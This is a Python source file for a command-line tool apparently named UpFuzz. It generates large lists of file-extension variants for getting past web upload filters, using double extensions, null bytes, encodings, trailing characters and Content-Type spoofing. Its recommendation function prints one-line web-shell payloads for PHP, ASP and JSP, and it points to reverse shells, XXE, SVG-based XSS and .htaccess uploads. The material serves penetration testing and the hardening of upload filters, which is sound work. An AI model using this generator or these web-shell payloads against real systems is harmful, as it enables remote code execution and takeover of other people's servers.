#!/usr/bin/env python3

"""
Enhanced File Extension Bypass Generator
Generates comprehensive lists of file extensions for bypassing upload filters
with Content-Type recommendations and specialized presets
"""

import argparse
import json


def generate_extensions(
    malicious_exts,
    benign_exts,
    delimiters,
    case_variations=True,
    output_file=None,
    show_content_types=True,
):
    """
    Generate comprehensive list of extension combinations for bypass testing

    Args:
        malicious_exts: List of malicious extensions (e.g., ['.php', '.jsp'])
        benign_exts: List of benign extensions (e.g., ['.jpg', '.png'])
        delimiters: List of delimiters/separators (e.g., ['', '.', '%00'])
        case_variations: Whether to include case variations
        output_file: Optional output file path
        show_content_types: Whether to show Content-Type recommendations
    """

    extensions = set()

    # Basic malicious extensions
    for mal_ext in malicious_exts:
        extensions.add(mal_ext)

        # Case variations for basic extensions
        if case_variations:
            extensions.update(generate_case_variations(mal_ext))

    # Double extensions: malicious.benign
    for mal_ext in malicious_exts:
        for ben_ext in benign_exts:
            extensions.add(f"{mal_ext}{ben_ext}")

            # Case variations
            if case_variations:
                extensions.update(generate_case_variations(f"{mal_ext}{ben_ext}"))

    # Reverse double extensions: benign.malicious
    for ben_ext in benign_exts:
        for mal_ext in malicious_exts:
            extensions.add(f"{ben_ext}{mal_ext}")

            # Case variations
            if case_variations:
                extensions.update(generate_case_variations(f"{ben_ext}{mal_ext}"))

    # Extensions with delimiters: malicious[delimiter]benign
    for mal_ext in malicious_exts:
        for delimiter in delimiters:
            for ben_ext in benign_exts:
                if delimiter:  # Skip empty delimiter as it's covered above
                    ext = f"{mal_ext}{delimiter}{ben_ext}"
                    extensions.add(ext)

                    # Case variations
                    if case_variations:
                        extensions.update(generate_case_variations(ext))

    # Triple extensions: malicious.benign.benign
    for mal_ext in malicious_exts:
        for ben_ext1 in benign_exts[:4]:  # Limit to common ones to avoid explosion
            for ben_ext2 in benign_exts[:4]:
                if ben_ext1 != ben_ext2:  # Avoid duplicates like .jpg.jpg
                    extensions.add(f"{mal_ext}{ben_ext1}{ben_ext2}")

    # Trailing characters
    trailing_chars = [" ", ".", "/", "\\", "%20", "%2e", "%2f", "%5c"]
    for mal_ext in malicious_exts:
        for char in trailing_chars:
            extensions.add(f"{mal_ext}{char}")
            # Add with benign extension after trailing char
            for ben_ext in benign_exts[:3]:  # Limit to avoid explosion
                extensions.add(f"{mal_ext}{char}{ben_ext}")

    # Special bypass techniques
    for mal_ext in malicious_exts:
        for ben_ext in benign_exts[:4]:  # Limit for performance
            # Unicode variations
            extensions.add(f"{mal_ext}\u0000{ben_ext}")  # Null byte
            extensions.add(f"{mal_ext}\u00a0{ben_ext}")  # Non-breaking space

            # Directory traversal attempts
            extensions.add(f"../{mal_ext}")
            extensions.add(f"../uploads/{mal_ext}")

            # With various encodings
            extensions.add(f"{mal_ext}%252e{ben_ext}")  # Double URL encoding
            extensions.add(f"{mal_ext}%c0%ae{ben_ext}")  # UTF-8 overlong encoding

    # Convert to sorted list
    extension_list = sorted(list(extensions))

    # Generate Content-Type recommendations
    content_type_map = (
        get_content_type_recommendations(extension_list) if show_content_types else {}
    )

    # Output results
    if output_file:
        output_data = {
            "extensions": extension_list,
            "content_types": content_type_map,
            "total_count": len(extension_list),
            "recommendations": get_testing_recommendations(malicious_exts),
        }

        if output_file.endswith(".json"):
            with open(output_file, "w") as f:
                json.dump(output_data, f, indent=2)
        else:
            with open(output_file, "w") as f:
                f.write("# File Extension Bypass List\n")
                f.write(f"# Generated {len(extension_list)} extensions\n\n")

                if show_content_types and content_type_map:
                    f.write("# Content-Type Recommendations:\n")
                    for ext_pattern, content_types in content_type_map.items():
                        f.write(f"# {ext_pattern}: {', '.join(content_types)}\n")
                    f.write("\n")

                for ext in extension_list:
                    f.write(f"{ext}\n")

        print(f"Generated {len(extension_list)} extensions and saved to {output_file}")

        if show_content_types:
            print("\nContent-Type Recommendations:")
            display_content_type_recommendations(content_type_map)
    else:
        for ext in extension_list:
            print(ext)

        if show_content_types:
            print("\n" + "=" * 50)
            print("Content-Type Recommendations:")
            print("=" * 50)
            display_content_type_recommendations(content_type_map)

        print(f"\nTotal extensions generated: {len(extension_list)}")

    return extension_list


def get_content_type_recommendations(extensions):
    """Generate Content-Type recommendations based on file extensions"""

    content_type_mapping = {
        # Web executable files
        ".php": [
            "application/x-httpd-php",
            "text/plain",
            "image/jpeg",
            "application/octet-stream",
        ],
        ".php3": ["application/x-httpd-php", "text/plain", "image/jpeg"],
        ".php4": ["application/x-httpd-php", "text/plain", "image/jpeg"],
        ".php5": ["application/x-httpd-php", "text/plain", "image/jpeg"],
        ".phtml": ["application/x-httpd-php", "text/html", "text/plain"],
        ".phar": [
            "application/x-php-archive",
            "application/octet-stream",
            "text/plain",
        ],
        ".phps": ["application/x-httpd-php-source", "text/plain"],
        ".pht": ["application/x-httpd-php", "text/plain"],
        ".inc": ["text/plain", "application/x-httpd-php"],
        # ASP files
        ".asp": ["application/x-asp", "text/asp", "text/plain", "image/jpeg"],
        ".aspx": ["application/x-aspx", "text/plain", "image/jpeg"],
        ".ashx": ["application/x-aspx", "text/plain"],
        ".asmx": ["application/x-aspx", "text/xml"],
        ".config": ["text/xml", "application/xml", "text/plain"],
        # JSP files
        ".jsp": ["application/x-jsp", "text/plain", "image/jpeg"],
        ".jspx": ["application/x-jsp", "text/xml", "application/xml"],
        # Server-side includes
        ".shtml": ["text/html", "text/plain"],
        # XML/SVG files (XXE potential)
        ".xml": ["application/xml", "text/xml", "text/plain"],
        ".svg": ["image/svg+xml", "text/xml", "application/xml", "text/plain"],
        # ColdFusion
        ".cfm": ["application/x-cfm", "text/plain"],
        ".cfml": ["application/x-cfm", "text/plain"],
        # Other scripting
        ".pl": ["application/x-perl", "text/plain"],
        ".cgi": ["application/x-cgi", "text/plain"],
        ".py": ["application/x-python", "text/plain"],
        ".rb": ["application/x-ruby", "text/plain"],
        ".sh": ["application/x-sh", "text/plain"],
        # Image files (for masquerading)
        ".jpg": ["image/jpeg"],
        ".jpeg": ["image/jpeg"],
        ".png": ["image/png"],
        ".gif": ["image/gif"],
        ".bmp": ["image/bmp"],
        ".webp": ["image/webp"],
        # Document files
        ".pdf": ["application/pdf"],
        ".doc": ["application/msword"],
        ".docx": [
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        ],
        ".txt": ["text/plain"],
        ".rtf": ["application/rtf"],
    }

    recommendations = {}

    for ext in extensions:
        # Find the base extension to recommend content types
        base_ext = None

        # Check for exact matches first
        for known_ext in content_type_mapping:
            if ext.endswith(known_ext):
                base_ext = known_ext
                break

        if base_ext:
            # Determine strategy based on extension structure
            if "." in ext[1:]:  # Multiple extensions
                if any(img_ext in ext for img_ext in [".jpg", ".jpeg", ".png", ".gif"]):
                    # If it contains image extension, recommend image content types first
                    img_types = []
                    for img_ext in [".jpg", ".jpeg", ".png", ".gif"]:
                        if img_ext in ext:
                            img_types.extend(content_type_mapping.get(img_ext, []))
                    recommendations[ext] = img_types + content_type_mapping[base_ext]
                else:
                    recommendations[ext] = content_type_mapping[base_ext]
            else:
                recommendations[ext] = content_type_mapping[base_ext]

    return recommendations


def display_content_type_recommendations(content_type_map):
    """Display Content-Type recommendations in a readable format"""

    # Group by content type patterns
    grouped = {}
    for ext, content_types in content_type_map.items():
        if content_types:
            primary_type = content_types[0]
            if primary_type not in grouped:
                grouped[primary_type] = []
            grouped[primary_type].append(ext)

    for content_type, extensions in grouped.items():
        if len(extensions) <= 5:
            print(f"  {content_type}: {', '.join(extensions)}")
        else:
            print(
                f"  {content_type}: {', '.join(extensions[:5])} ... (+{len(extensions) - 5} more)"
            )

    print("\nKey Content-Type Bypass Strategies:")
    print("  • For image masquerading: Use image/jpeg, image/png, image/gif")
    print("  • For text-based bypass: Use text/plain")
    print("  • For XXE attacks (XML/SVG): Use application/xml, text/xml")
    print("  • For generic bypass: Use application/octet-stream")


def generate_case_variations(extension):
    """Generate case variations of an extension"""
    variations = set()

    # All uppercase
    variations.add(extension.upper())

    # All lowercase (original is likely already lowercase)
    variations.add(extension.lower())

    # Mixed case variations
    if len(extension) > 1:
        # First letter uppercase
        variations.add(extension[0].upper() + extension[1:].lower())

        # Last letter uppercase
        variations.add(extension[:-1].lower() + extension[-1].upper())

        # Random mixed case (a few common patterns)
        if "." in extension:
            parts = extension.split(".")
            if len(parts) >= 2:
                # .pHp, .PhP, .PHP for the last part
                last_part = parts[-1]
                if len(last_part) >= 3:
                    variations.add(
                        extension[: -len(last_part)]
                        + last_part[0].upper()
                        + last_part[1:].lower()
                    )
                    variations.add(
                        extension[: -len(last_part)]
                        + last_part[:-1].title()
                        + last_part[-1].upper()
                    )

    return variations


def get_predefined_lists():
    """Return predefined lists of extensions and delimiters"""

    # Core malicious extensions from your list and more
    php_extensions = [
        ".php",
        ".php3",
        ".php4",
        ".php5",
        ".php7",
        ".phtml",
        ".phar",
        ".phps",
        ".pht",
        ".pgif",
        ".inc",
        ".hphp",
        ".ctp",
        ".module",
    ]

    asp_extensions = [
        ".asp",
        ".aspx",
        ".asa",
        ".ashx",
        ".asmx",
        ".cer",
        ".config",
        ".aspq",
        ".axd",
        ".cshtm",
        ".cshtml",
        ".rem",
        ".soap",
        ".vbhtm",
        ".vbhtml",
    ]

    jsp_extensions = [
        ".jsp",
        ".jspx",
        ".jsw",
        ".jsv",
        ".jspf",
        ".wss",
        ".do",
        ".action",
    ]

    coldfusion_extensions = [".cfm", ".cfml", ".cfc", ".dbm"]

    scripting_extensions = [
        ".pl",
        ".cgi",
        ".py",
        ".rb",
        ".sh",
        ".shtml",
        ".shtm",
        ".stm",
    ]

    xml_extensions = [".xml", ".svg", ".xsl", ".xslt", ".xsd", ".dtd"]

    other_extensions = [".htaccess", ".htpasswd", ".bat", ".cmd", ".ps1", ".vbs"]

    all_malicious = (
        php_extensions
        + asp_extensions
        + jsp_extensions
        + coldfusion_extensions
        + scripting_extensions
        + xml_extensions
        + other_extensions
    )

    benign_extensions = [
        ".jpg",
        ".jpeg",
        ".png",
        ".gif",
        ".bmp",
        ".tiff",
        ".webp",
        ".ico",
        ".pdf",
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".ppt",
        ".pptx",
        ".txt",
        ".rtf",
        ".csv",
        ".log",
        ".mp3",
        ".mp4",
        ".avi",
        ".mov",
        ".wmv",
        ".flv",
        ".zip",
        ".rar",
        ".tar",
        ".gz",
        ".7z",
    ]

    delimiters = [
        "",  # No delimiter (basic double extension)
        "%00",  # Null byte
        "%20",  # Space
        "%2e",  # Dot (URL encoded)
        "%2f",  # Forward slash
        "%5c",  # Backslash
        ".",  # Additional dot
        " ",  # Space
        "/",  # Forward slash
        "\\",  # Backslash
        ";",  # Semicolon
        ":",  # Colon
        "::$DATA",  # NTFS ADS
        "%c0%ae",  # UTF-8 overlong encoding
        "%252e",  # Double URL encoding
        "%c1%9c",  # Another overlong encoding
    ]

    return (
        all_malicious,
        benign_extensions,
        delimiters,
        php_extensions,
        asp_extensions,
        jsp_extensions,
        xml_extensions,
        coldfusion_extensions,
    )


def get_testing_recommendations(malicious_exts):
    """Get testing recommendations based on the extensions being tested"""

    recommendations = []

    if any("php" in ext for ext in malicious_exts):
        recommendations.append(
            "PHP Testing: Look for code execution via <?php system($_GET['cmd']); ?>"
        )
        recommendations.append("PHP Testing: Test with web shells and reverse shells")

    if any("asp" in ext for ext in malicious_exts):
        recommendations.append(
            "ASP Testing: Use <% eval request('cmd') %> for code execution"
        )
        recommendations.append(
            "ASP Testing: Test .config files for web.config manipulation"
        )

    if any("jsp" in ext for ext in malicious_exts):
        recommendations.append(
            "JSP Testing: Use <%= Runtime.getRuntime().exec(request.getParameter('cmd')) %> for execution"
        )

    if any(ext in [".xml", ".svg"] for ext in malicious_exts):
        recommendations.append(
            "XXE Testing: Use XML/SVG files with external entity references"
        )
        recommendations.append(
            "XSS Testing: SVG files can contain JavaScript for XSS attacks"
        )

    if ".htaccess" in malicious_exts:
        recommendations.append(
            "Apache Testing: Upload .htaccess to change file handling behavior"
        )

    return recommendations


def main():
    parser = argparse.ArgumentParser(
        prog="upfuzz",
        description="UpFuzz - The Ultimate File Upload Bypass Generator\nGenerates comprehensive lists of file extensions for bypassing upload filters.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --preset web --output extensions.txt
  %(prog)s --preset xxe --show-content-types  
  %(prog)s --preset php-comprehensive --output php_test.json
  %(prog)s --malicious .php,.jsp --benign .jpg,.png --delimiters ",%%00,."
  %(prog)s --list-presets
  %(prog)s --help

For more information and usage examples, visit: https://github.com/yourusername/upfuzz
        """,
    )

    parser.add_argument(
        "--malicious",
        "-m",
        help="Comma-separated list of malicious extensions (e.g., .php,.jsp)",
    )
    parser.add_argument(
        "--benign",
        "-b",
        help="Comma-separated list of benign extensions (e.g., .jpg,.png)",
    )
    parser.add_argument(
        "--delimiters",
        "-d",
        help='Comma-separated list of delimiters (e.g., ",%%00,.,%%20")',
    )
    parser.add_argument(
        "--preset",
        choices=[
            "web",
            "php",
            "php-comprehensive",
            "asp",
            "jsp",
            "xxe",
            "xss",
            "coldfusion",
            "scripting",
            "all",
            "common",
        ],
        help="Use predefined extension sets",
    )
    parser.add_argument("--output", "-o", help="Output file path (.txt or .json)")
    parser.add_argument(
        "--no-case-variations",
        action="store_true",
        help="Disable case variation generation",
    )
    parser.add_argument(
        "--show-content-types",
        action="store_true",
        default=True,
        help="Show Content-Type recommendations (default: True)",
    )
    parser.add_argument(
        "--no-content-types",
        action="store_true",
        help="Hide Content-Type recommendations",
    )
    parser.add_argument(
        "--list-presets", action="store_true", help="List available presets and exit"
    )

    args = parser.parse_args()

    if args.list_presets:
        print("Available presets:")
        print("  web              : PHP, ASP, JSP extensions for general web testing")
        print("  php              : PHP-specific extensions")
        print("  php-comprehensive: All PHP variants including less common ones")
        print("  asp              : ASP-specific extensions")
        print("  jsp              : JSP-specific extensions")
        print("  xxe              : XML/SVG extensions for XXE testing")
        print("  xss              : Extensions suitable for XSS attacks (SVG, HTML)")
        print("  coldfusion       : ColdFusion-specific extensions")
        print("  scripting        : General scripting extensions (Perl, Python, etc.)")
        print("  common           : Most commonly exploited extensions")
        print("  all              : All malicious extensions")
        return

    # Get predefined lists
    (
        all_malicious,
        all_benign,
        all_delimiters,
        php_exts,
        asp_exts,
        jsp_exts,
        xml_exts,
        cf_exts,
    ) = get_predefined_lists()

    # Handle content type display
    show_content_types = args.show_content_types and not args.no_content_types

    # Handle presets
    if args.preset:
        if args.preset == "php":
            malicious_exts = php_exts[:8]  # Core PHP extensions
        elif args.preset == "php-comprehensive":
            malicious_exts = php_exts  # All PHP extensions
        elif args.preset == "asp":
            malicious_exts = asp_exts
        elif args.preset == "jsp":
            malicious_exts = jsp_exts
        elif args.preset == "xxe":
            malicious_exts = xml_exts + [".svg", ".xml", ".xsl", ".dtd"]
        elif args.preset == "xss":
            malicious_exts = [".svg", ".xml", ".html", ".htm", ".xhtml"]
        elif args.preset == "coldfusion":
            malicious_exts = cf_exts
        elif args.preset == "scripting":
            malicious_exts = [".pl", ".cgi", ".py", ".rb", ".sh", ".shtml"]
        elif args.preset == "web":
            malicious_exts = (
                php_exts[:6] + asp_exts[:6] + jsp_exts[:4]
            )  # Most common web extensions
        elif args.preset == "common":
            malicious_exts = [
                ".php",
                ".php5",
                ".phtml",
                ".asp",
                ".aspx",
                ".jsp",
                ".svg",
                ".xml",
            ]
        elif args.preset == "all":
            malicious_exts = all_malicious

        # Adjust benign extensions based on preset
        if args.preset in ["xxe", "xss"]:
            benign_exts = [
                ".txt",
                ".xml",
                ".svg",
                ".jpg",
                ".png",
            ]  # Include XML-type extensions
        else:
            benign_exts = all_benign[:8]  # Use common image and doc extensions

        delimiters = all_delimiters
    else:
        # Parse manual input
        if not all([args.malicious, args.benign]):
            parser.error("Either use --preset or provide both --malicious and --benign")

        malicious_exts = [ext.strip() for ext in args.malicious.split(",")]
        benign_exts = [ext.strip() for ext in args.benign.split(",")]

        if args.delimiters:
            delimiters = args.delimiters.split(",")
        else:
            delimiters = ["", "%00", ".", "%20"]  # Default delimiters

    # Ensure extensions start with dot
    malicious_exts = [
        ext if ext.startswith(".") else f".{ext}" for ext in malicious_exts
    ]
    benign_exts = [ext if ext.startswith(".") else f".{ext}" for ext in benign_exts]

    # Generate extensions
    case_variations = not args.no_case_variations

    print("Generating extensions with:")
    print(f"  Malicious: {malicious_exts}")
    print(f"  Benign: {benign_exts[:5]}{'...' if len(benign_exts) > 5 else ''}")
    print(f"  Delimiters: {delimiters[:5]}{'...' if len(delimiters) > 5 else ''}")
    print(f"  Case variations: {case_variations}")
    print(f"  Content-Type recommendations: {show_content_types}")
    print()

    generate_extensions(
        malicious_exts,
        benign_exts,
        delimiters,
        case_variations,
        args.output,
        show_content_types,
    )


if __name__ == "__main__":
    main()
